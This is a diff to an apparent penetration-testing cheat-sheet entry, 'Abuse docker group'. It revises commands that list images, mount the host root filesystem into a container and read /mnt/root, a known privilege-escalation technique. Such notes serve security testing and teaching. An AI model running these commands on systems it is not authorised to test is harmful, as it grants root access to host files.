@@ -10,10 +10,17 @@ tags: ["docker", "privesc", "container", "escape"]
 #### Abuse docker group
 
 ```bash
-docker run -v /:/mnt -it bash bash
+# List images
+docker images
 ```
 
 ```bash
+# Mount host root filesystem
+docker run -v /:/mnt -it image_name bash
+```
+
+```bash
+# Check
 ls /mnt/root
 ```
 
